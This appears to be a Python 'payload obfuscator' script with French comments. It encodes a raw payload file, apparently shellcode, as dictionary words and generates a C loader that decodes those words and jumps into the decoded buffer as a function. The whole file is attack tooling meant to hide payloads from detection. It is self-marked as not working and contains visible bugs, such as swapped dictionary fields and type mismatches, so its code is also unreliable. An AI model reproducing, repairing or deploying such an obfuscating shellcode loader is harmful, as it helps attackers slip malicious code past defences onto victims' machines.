#!/usr/bin/env python3
import sys
import requests
import random
import json

#NOT WORKING

def main(input_file):

    c_headers = '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
    '''


    # Creation du dictionnaire de correspondance
    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
    response = requests.get(word_site)
    words = response.content.splitlines()
    words = [word.decode('utf-8') for word in words]
    random.shuffle(words)
    hex_values = [f'0x{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))
    dict_items = [f'{{"{hex_val}", {word}}}' for word, hex_val in word_dict.items()]
    c_dict = "struct wordDictEntry {\n    const char* word;\n    BYTE hex_val;\n};\n\nconst struct wordDictEntry wordDict[] = {\n    " + ",\n    ".join(dict_items) + "\n};"


    sub_encoded = 0
    encoded_string = ""
    concat_all = "const char* obf_data = "
    with open(input_file, 'rb') as f_in:
        byte = f_in.read(1)
        while byte:
            sub_encoded=sub_encoded+1
            max_words_per_part = 50
            concat_all += "data"+str(sub_encoded)+"+"
            sub_generated_encoded_string = "const char* data"+str(sub_encoded)+" = \""
            for i in range(0, max_words_per_part):
                hex_value = f"0x{byte.hex()}"
                if hex_value in word_dict:
                    sub_generated_encoded_string += word_dict[hex_value] + ' '                    
                byte = f_in.read(1)
            sub_generated_encoded_string += "\";"
            encoded_string += sub_generated_encoded_string + "\n"
    concat_all = concat_all[:-1] + ";"
    encoded_string = encoded_string.rstrip()


    c_decode_function = '''
char* decodePayload(const char* encoded) {
    char* decoded = (char*)malloc(strlen(encoded) + 1);
    char* p = decoded;
    const char* start = encoded;
    while (*start) {
        const char* end = start;
        while (*end && *end != ' ') {
            ++end;
        }

        size_t len = end - start;
        char word[len + 1];
        strncpy(word, start, len);
        word[len] = '\0';

        int found = 0;
        for (int i = 0; i < sizeof(wordDict) / sizeof(wordDict[0]); ++i) {
            if (strcmp(wordDict[i].word, word) == 0) {
                *p = (char)strtol(wordDict[i].hex_val + 2, NULL, 16);
                ++p;
                found = 1;
                break;
            }
        }

        if (!found) {
            fprintf(stderr, "[!] Erreur de décodage : mot inconnu %s\n", word);
        }

        start = end;
        if (*start == ' ') {
            ++start;
        }
    }
    *p = '\0';
    return decoded;
}
    '''


    c_exec_function = '''
void executePayload(const char* payload) {
    void (*func)() = (void(*)())payload;
    printf("[+] Execution du payload...\n");
    func();
}
    '''


    c_main_function = '''
int main() {
    char* decoded_payload = decodePayload(obf_data);
    executePayload(decoded_payload);
    free(decoded_payload);
    return 0;
}
    '''


    # Combiner toutes les parties dans un fichier C généré
    c_code = f"{c_headers}\n\n\n{c_dict}\n\n\n{encoded_string}\n\n\n{concat_all}\n\n\n{c_decode_function}\n\n\n{c_exec_function}\n\n\n{c_main_function}"
    # Sauvegarder le code généré dans un fichier
    with open('generated_code.c', 'w') as f:
        f.write(c_code)
    print("Code C généré avec succès dans 'generated_code.c'")





if __name__ == "__main__":
    print("##########################################")
    print("########### PAYLOAD OBFUSCATOR ###########")
    print("##########################################\n")
    if len(sys.argv) != 2:
        print("Usage: python encode_c.py <path_to_raw_payload_file>\n")
        sys.exit(1)
    
    file_path = sys.argv[1]
    main(file_path)
